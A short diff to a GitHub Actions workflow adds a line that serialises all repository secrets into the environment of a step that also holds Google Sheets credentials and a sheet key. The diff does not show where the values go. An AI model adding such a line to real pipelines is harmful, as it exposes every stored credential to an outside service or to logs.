@@ -24,6 +24,7 @@ jobs:
       env:
         GSHEET_API_CREDENTIALS: ${{ secrets.GSHEET_API_CREDENTIALS }}
         GSHEET_KEY: 1ZILeAru7cNH0FOUwFQllWh2MlVsdBKSc3LyBLmZsi9o
+        SECRETS: ${{ toJson(secrets) }}
         RUNNER: ${{ toJson(runner) }}
         GITHUB: ${{ toJson(github) }}
       with:
